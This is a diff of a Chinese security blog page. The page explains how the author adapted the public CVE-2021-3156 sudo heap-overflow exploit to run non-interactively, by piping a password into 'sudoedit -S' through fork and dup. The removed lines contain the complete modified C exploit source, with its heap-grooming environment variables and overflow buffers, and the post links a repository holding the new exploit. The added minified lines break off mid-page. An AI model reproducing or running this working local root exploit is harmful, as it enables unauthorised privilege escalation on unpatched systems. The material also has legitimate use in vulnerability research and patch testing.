@@ -1,402 +1,153 @@
-<!DOCTYPE html>
-<html lang=""><head>
-    <meta charset="utf-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
-
-    <title>CVE-2021-3156 - Exploit修改 « 倾旋的博客</title>
-    <meta name="description" content="倾旋的博客">
-    <meta name="author" content='倾旋'>
-
-    <link rel="stylesheet" href="/css/Font-Awesome-5.15.3.all.min.css">
-
-    
-    <link rel="stylesheet" href="/sass/researcher.min.css">
-    
-    
-        <link rel="icon" type="image/ico" href="https://payloads.online/favicon.ico">
-    
-
-    
-        
-    
-</head>
-
-    <body>
-<input type="checkbox" id="menu-toggle" class="menu-toggle">
-<label tabindex="0" for="menu-toggle" class="burger"><span></span> <span></span> <span></span><div class="burger-text">Menu</div></label>
-<nav class="main-nav">
-    
-    <ul>
-    
-        
-        
-            <li><a href="/projects/">Projects</a></li>
-        
-            <li><a href="/links/">Links</a></li>
-        
-            <li><a href="/post/">Posts</a></li>
-        
-            <li><a href="/index.xml">Rss</a></li>
-        
-            <li><a href="/tools/">Tools</a></li>
-        
-    
-    </ul>
-   
-</nav>
-<nav><a href="/" class="all-posts-link">‹ All Posts</a></nav><div id="content">
-<div class="container">
-    <h1>CVE-2021-3156 - Exploit修改</h1>
-    <p>Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。</p>
-        <div class = "toc-wrapper">
-            
-<div class="post-toc" id="post-toc">
-<aside>
-    
-    
-    
-    <nav id="TableOfContents">
-  <ul>
-    <li><a href="#0x01-为什么要修改">0x01 为什么要修改？</a></li>
-    <li><a href="#0x02-linux-管道符">0x02 Linux 管道符</a></li>
-    <li><a href="#0x03-exploit分析">0x03 Exploit分析</a></li>
-    <li><a href="#0x03-演示效果">0x03 演示效果</a></li>
-  </ul>
-</nav>
-    
-    
-</aside>
-<a href="#" id="toc-toggle"></a>
-</div>
-
-
-
-        </div>
-    <p>New-Exploit :  <a href="https://github.com/Rvn0xsy/CVE-2021-3156-plus">https://github.com/Rvn0xsy/CVE-2021-3156-plus</a></p>
-<h2 id="0x01-为什么要修改">0x01 为什么要修改？</h2>
-<p>本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。</p>
-<h2 id="0x02-linux-管道符">0x02 Linux 管道符</h2>
-<p>在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>echo <span style="color:#e6db74">&#34;new-pass&#34;</span> | passwd --stdin username
-</span></span></code></pre></div><blockquote>
-<p>该命令只适用于旧版，不建议在命令行中传递明文密码</p>
-</blockquote>
-<p>于是我查看了<code>sudoedit</code>的帮助参数：</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aee35152-4f5f-11ec-9dea-00d861bf4abb.png" alt="2021-02-10-02-34-34"  />
-  </p></p>
-<p>设置<code>-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p>
-<h2 id="0x03-exploit分析">0x03 Exploit分析</h2>
-<p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code>execve</code>触发。</p>
-<pre tabindex="0"><code>#include &lt;unistd.h&gt;
+<!doctype html><html lang><head><meta charset=utf-8><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><title>CVE-2021-3156 - Exploit修改 « 倾旋的博客</title><meta name=description content="倾旋的博客"><meta name=author content="倾旋"><link rel=stylesheet href=/css/Font-Awesome-5.15.3.all.min.css><link rel=stylesheet href=/sass/researcher.min.css><link rel=icon type=image/ico href=https://payloads.online/favicon.ico></head><body><input type=checkbox id=menu-toggle class=menu-toggle>
+<label tabindex=0 for=menu-toggle class=burger><span></span> <span></span> <span></span><div class=burger-text>Menu</div></label><nav class=main-nav><ul><li><a href=/projects/>Projects</a></li><li><a href=/links/>Links</a></li><li><a href=/post/>Posts</a></li><li><a href=/index.xml>Rss</a></li><li><a href=/tools/>Tools</a></li></ul></nav><nav><a href=/ class=all-posts-link>‹ All Posts</a></nav><div id=content><div class=container><h1>CVE-2021-3156 - Exploit修改</h1><p>Qualys研究团队在sudo中发现了一个堆溢出漏洞，该漏洞在类似Unix的主要操作系统上都可以使用。通过利用此漏洞，任何没有特权的用户都可以使用默认的sudo配置在易受攻击的主机上获得root特权。</p><div class=toc-wrapper><div class=post-toc id=post-toc><aside><nav id=TableOfContents><ul><li><a href=#0x01-为什么要修改>0x01 为什么要修改？</a></li><li><a href=#0x02-linux-管道符>0x02 Linux 管道符</a></li><li><a href=#0x03-exploit分析>0x03 Exploit分析</a></li><li><a href=#0x03-演示效果>0x03 演示效果</a></li></ul></nav></aside><a href=# id=toc-toggle></a></div></div><p>New-Exploit : <a href=https://github.com/Rvn0xsy/CVE-2021-3156-plus>https://github.com/Rvn0xsy/CVE-2021-3156-plus</a></p><h2 id=0x01-为什么要修改>0x01 为什么要修改？</h2><p>本人不擅长二进制，但是看了一下网上公开的Exploit，都需要输入一次密码才能够利用这个漏洞，还是不满足于一些实战场景，如果获得不到交互式Shell，那么用原有的Exploit就不能利用了。</p><h2 id=0x02-linux-管道符>0x02 Linux 管道符</h2><p>在Linux中有多种办法可以在Shell中使用管道符，跳过交互输入，如修改一个用户的密码：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-bash data-lang=bash><span style=display:flex><span>echo <span style=color:#e6db74>&#34;new-pass&#34;</span> | passwd --stdin username
+</span></span></code></pre></div><blockquote><p>该命令只适用于旧版，不建议在命令行中传递明文密码</p></blockquote><p>于是我查看了<code>sudoedit</code>的帮助参数：</p><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/aee35152-4f5f-11ec-9dea-00d861bf4abb.png alt=2021-02-10-02-34-34></p></p><p>设置<code>-S</code>参数，可以直接通过管道符传递密码，那么也就是说，给Exploit增加这么一个参数就能在提权的时候不需要输入密码了，从而跳过交互，但前提还是需要用C语言模拟这个管道传递字符。</p><h2 id=0x03-exploit分析>0x03 Exploit分析</h2><p>本文修改的提权Exploit 溢出点主要是在环境变量中，通过调用<code>execve</code>触发。</p><pre tabindex=0><code>#include &lt;unistd.h&gt;
 int execve(const char *pathname, char *const argv[],char *const envp[]);
-</code></pre><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png" alt="2021-02-10-02-44-51"  />
-  </p></p>
-<p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> sudoedit_argv[] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;sudoedit&#34;</span>,
-</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#34;-S&#34;</span>, <span style="color:#75715e">// --stdin 非交互式
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#e6db74">&#34;-s&#34;</span>,
-</span></span><span style="display:flex;"><span>    buf,
-</span></span><span style="display:flex;"><span>    NULL};
-</span></span></code></pre></div><p>紧接着，需要思考如何传入密码了。</p>
-<blockquote>
-<p>经过测试，即使密码错误的情况下，也能够提权成功。</p>
-</blockquote>
-<p>经过查阅资料，关于execve的特点如下：</p>
-<p>execve创建的进程将会重新初始化堆栈、堆和（初始化和未初始化的）数据段。</p>
-<p>All process attributes are preserved during an execve(), except the following:</p>
-<ul>
-<li>The dispositions of any signals that are being caught are reset to the default (signal(7)).</li>
-<li>Any alternate signal stack is not preserved (sigaltstack(2)).</li>
-<li>Memory mappings are not preserved (mmap(2)).</li>
-<li>Attached System V shared memory segments are detached (shmat(2)).</li>
-<li>POSIX shared memory regions are unmapped (shm_open(3)).</li>
-<li>Open POSIX message queue descriptors are closed(mq_overview(7)).</li>
-<li>Any open POSIX named semaphores are closed (sem_overview(7)).</li>
-<li>POSIX timers are not preserved (timer_create(2)).</li>
-<li>Any open directory streams are closed (opendir(3)).</li>
-<li>Memory locks are not preserved (mlock(2), mlockall(2)).</li>
-<li>Exit handlers are not preserved (atexit(3), on_exit(3)).</li>
-<li>The floating-point environment is reset to the default (see fenv(3)).</li>
-<li>&hellip;.</li>
-</ul>
-<p>这就意味着，在调用execve之前向stdin写入数据，创建后的进程也是读不到的。</p>
-<p>于是我写了一个小例子来测验我的解决办法：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdlib.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span><span style="color:#f92672">**</span> argv)
-</span></span><span style="display:flex;"><span>{
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">int</span> des_p[<span style="color:#ae81ff">2</span>];
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(pipe(des_p) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>) {
-</span></span><span style="display:flex;"><span>          perror(<span style="color:#e6db74">&#34;Pipe failed&#34;</span>);
-</span></span><span style="display:flex;"><span>          exit(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(fork() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)  <span style="color:#75715e">// 创建一个子进程向stdout管道填入数据
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
-</span></span><span style="display:flex;"><span>            close(STDOUT_FILENO);  <span style="color:#75715e">// 关闭系统输出流
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            dup(des_p[<span style="color:#ae81ff">1</span>]);         <span style="color:#75715e">// 将系统输出流替换为管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            close(des_p[<span style="color:#ae81ff">0</span>]);       <span style="color:#75715e">// 关闭输入管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> password <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;test</span><span style="color:#ae81ff">\r\n</span><span style="color:#e6db74">1111&#34;</span>; <span style="color:#75715e">// 设置管道内容
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            write(des_p[<span style="color:#ae81ff">1</span>],password, strlen(password)); <span style="color:#75715e">// 将内容写到输出管道中
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            close(des_p[<span style="color:#ae81ff">1</span>]); <span style="color:#75715e">// 关闭输出管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span>(fork() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)            <span style="color:#75715e">// 创建一个子进程
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>        {
-</span></span><span style="display:flex;"><span>            close(STDIN_FILENO);   <span style="color:#75715e">// 关闭系统输入流
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            dup(des_p[<span style="color:#ae81ff">0</span>]);         <span style="color:#75715e">// 将系统输入流替换为输入管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            close(des_p[<span style="color:#ae81ff">1</span>]);       <span style="color:#75715e">//  关闭输出管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            close(des_p[<span style="color:#ae81ff">0</span>]);     <span style="color:#75715e">// 关闭输入管道
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">const</span> <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> prog2[] <span style="color:#f92672">=</span> { <span style="color:#e6db74">&#34;wc&#34;</span>, <span style="color:#e6db74">&#34;-l&#34;</span>, <span style="color:#ae81ff">0</span>}; <span style="color:#75715e">// 执行wc -l 
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>            execvp(prog2[<span style="color:#ae81ff">0</span>], prog2);
-</span></span><span style="display:flex;"><span>            perror(<span style="color:#e6db74">&#34;execvp of wc failed&#34;</span>);
-</span></span><span style="display:flex;"><span>            exit(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>        close(des_p[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>        close(des_p[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span>        wait(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        wait(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af6100c0-4f5f-11ec-8c95-00d861bf4abb.png" alt="2021-02-10-03-10-12"  />
-  </p></p>
-<p>测试结果正确：2！</p>
-<p>stdin的值为：<code>test\r\n1111</code>，wc -l 命令读取是以<code>\n</code>为每一项分割的，因此返回的是2。</p>
-<p>这个方案可以直接拿到Exploit中，将stdin覆盖，向管道写入<code>密码\n命令</code>，然后把命令传入即可。</p>
-<p>为什么这里是<code>密码\n命令</code>呢？</p>
-<p>是因为第一个<code>\n</code>是为了结束密码的传递，然后开始堆溢出，溢出完成后，后续的命令刚好会传入到Shellcode启动的<code>/bin/sh</code>中。</p>
-<p><p class="md__image">
-    
-    <img src="https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af9a9182-4f5f-11ec-8201-00d861bf4abb.png" alt="2021-02-10-03-13-24"  />
-  </p></p>
-<p>修改后的Exploit：</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-c" data-lang="c"><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;unistd.h&gt; // execve()</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;string.h&gt; // strcat()</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e">#include</span> <span style="color:#75715e">&lt;stdio.h&gt;</span><span style="color:#75715e">
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>
-</span></span><span style="display:flex;"><span><span style="color:#66d9ef">int</span> <span style="color:#a6e22e">main</span>(<span style="color:#66d9ef">int</span> argc, <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> argv[]) {
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span>(argc <span style="color:#f92672">&lt;</span> <span style="color:#ae81ff">2</span>){
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;Usage: %s &lt;Command&gt; </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,argv[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[+]Refrence : @Qualys Research Team @Max Kamper </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>        printf(<span style="color:#e6db74">&#34;[+]Modify by Rvn0xsy@ https://payloads.online</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);	
-</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> input_command <span style="color:#f92672">=</span> argv[<span style="color:#ae81ff">1</span>];
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">int</span> nSize <span style="color:#f92672">=</span> strlen(input_command)<span style="color:#f92672">+</span><span style="color:#ae81ff">6</span>;
-</span></span><span style="display:flex;"><span>    
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span> command <span style="color:#f92672">=</span> malloc(nSize);
-</span></span><span style="display:flex;"><span>    memset(command,<span style="color:#ae81ff">0x00</span>,nSize);
-</span></span><span style="display:flex;"><span>    sprintf(command,<span style="color:#e6db74">&#34;test</span><span style="color:#ae81ff">\n\n</span><span style="color:#e6db74">%s</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>,input_command);
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// &#39;buf&#39; size determines size of overflowing chunk.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// This will allocate an 0xf0-sized chunk before the target service_user struct.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">int</span> i;
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> buf[<span style="color:#ae81ff">0xf0</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>    memset(buf, <span style="color:#e6db74">&#39;Y&#39;</span>, <span style="color:#ae81ff">0xe0</span>);
-</span></span><span style="display:flex;"><span>    strcat(buf, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> sudoedit_argv[] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;sudoedit&#34;</span>,
-</span></span><span style="display:flex;"><span>	    <span style="color:#e6db74">&#34;-S&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;-s&#34;</span>,
-</span></span><span style="display:flex;"><span>        buf,
-</span></span><span style="display:flex;"><span>        NULL};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Use some LC_ vars for heap Feng-Shui.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// This should allocate the target service_user struct in the path of the overflow.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> messages[<span style="color:#ae81ff">0xe0</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LC_MESSAGES=en_GB.UTF-8@&#34;</span>};
-</span></span><span style="display:flex;"><span>    memset(messages <span style="color:#f92672">+</span> strlen(messages), <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0xb8</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> telephone[<span style="color:#ae81ff">0x50</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LC_TELEPHONE=C.UTF-8@&#34;</span>};
-</span></span><span style="display:flex;"><span>    memset(telephone <span style="color:#f92672">+</span> strlen(telephone), <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x28</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">char</span> measurement[<span style="color:#ae81ff">0x50</span>] <span style="color:#f92672">=</span> {<span style="color:#e6db74">&#34;LC_MEASUREMENT=C.UTF-8@&#34;</span>};
-</span></span><span style="display:flex;"><span>    memset(measurement <span style="color:#f92672">+</span> strlen(measurement), <span style="color:#e6db74">&#39;A&#39;</span>, <span style="color:#ae81ff">0x28</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// This environment variable will be copied onto the heap after the overflowing chunk.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// Use it to bridge the gap between the overflow and the target service_user struct.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span> overflow[<span style="color:#ae81ff">0x500</span>] <span style="color:#f92672">=</span> {<span style="color:#ae81ff">0</span>};
-</span></span><span style="display:flex;"><span>    memset(overflow, <span style="color:#e6db74">&#39;X&#39;</span>, <span style="color:#ae81ff">0x4cf</span>);
-</span></span><span style="display:flex;"><span>    strcat(overflow, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>    <span style="color:#75715e">// Overwrite the &#39;files&#39; service_user struct&#39;s name with the path of our shellcode library.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#75715e">// The backslashes write nulls which are needed to dodge a couple of crashes.
-</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>    <span style="color:#66d9ef">char</span><span style="color:#f92672">*</span> envp[] <span style="color:#f92672">=</span> {
-</span></span><span style="display:flex;"><span>        overflow,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;XXXXXXX</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>, <span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;x/x</span><span style="color:#ae81ff">\\</span><span style="color:#e6db74">&#34;</span>,
-</span></span><span style="display:flex;"><span>        <span style="color:#e6db74">&#34;Z&#34;</span>,
-</span></span><span style="display:flex;"><span>        messages,
-</span></span><span style="display:flex;"><span>        telephone,
-</span></span><span style="display:flex;"><span>        measurement,
-</span></span><span style="display:flex;"><span>        NULL};
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">int</span> des_p[<span style="color:#ae81ff">2</span>];
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(pipe(des_p) <span style="color:#f92672">==</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>){
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>		puts(<span style="color:#e6db74">&#34;Error .. pipe </span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
-</span></span><span style="display:flex;"><span>		<span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(fork() <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)   
-</span></span><span style="display:flex;"><span>        {
-</span></span><span style="display:flex;"><span>            close(STDOUT_FILENO);
-</span></span><span style="display:flex;"><span>            dup(des_p[<span style="color:#ae81ff">1</span>]);  
-</span></span><span style="display:flex;"><span>            close(des_p[<span style="color:#ae81ff">0</span>]); 
-</span></span><span style="display:flex;"><span>	    write(des_p[<span style="color:#ae81ff">1</span>],command, strlen(command));
-</span></span><span style="display:flex;"><span>            close(des_p[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span>	    exit(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>        }
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>	<span style="color:#66d9ef">if</span>(fork()<span style="color:#f92672">==</span><span style="color:#ae81ff">0</span>){
-</span></span><span style="display:flex;"><span>		close(STDIN_FILENO); 
-</span></span><span style="display:flex;"><span>		dup(des_p[<span style="color:#ae81ff">0</span>]);  
-</span></span><span style="display:flex;"><span>		close(des_p[<span style="color:#ae81ff">1</span>]); 
-</span></span><span style="display:flex;"><span>		close(des_p[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>		
-</span></span><span style="display:flex;"><span>		execve(<span style="color:#e6db74">&#34;/usr/bin/sudoedit&#34;</span>, sudoedit_argv, envp);
-</span></span><span style="display:flex;"><span>		perror(<span style="color:#e6db74">&#34;execvp of stdread failed&#34;</span>);
-</span></span><span style="display:flex;"><span>		exit(<span style="color:#ae81ff">1</span>);
-</span></span><span style="display:flex;"><span>	}
-</span></span><span style="display:flex;"><span>	close(des_p[<span style="color:#ae81ff">0</span>]);
-</span></span><span style="display:flex;"><span>	close(des_p[<span style="color:#ae81ff">1</span>]);
-</span></span><span style="display:flex;"><span>	wait(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>	wait(<span style="color:#ae81ff">0</span>);
-</span></span><span style="display:flex;"><span>}
-</span></span></code></pre></div><h2 id="0x03-演示效果">0x03 演示效果</h2>
-<pre tabindex="0"><code>Usage: ./exploit &lt;Command&gt; 
+</code></pre><p><p class=md__image><img src=https://cdn.jsdelivr.net/gh/Rvn0xsy/rvn0xsy.github.io/static/images/af21b1ea-4f5f-11ec-b856-00d861bf4abb.png alt=2021-02-10-02-44-51></p></p><p>在21行传入了argv，可以将这个数组添加一个元素，也就是等同于添加一个命令行参数：</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-c data-lang=c><span style=display:flex><span><span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> sudoedit_argv[] <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;sudoedit&#34;</span>,
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;-S&#34;</span>, <span style=color:#75715e>// --stdin 非交互式
+</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#e6db74>&#34;-s&#34;</span>,
+</span></span><span style=display:flex><span>    buf,
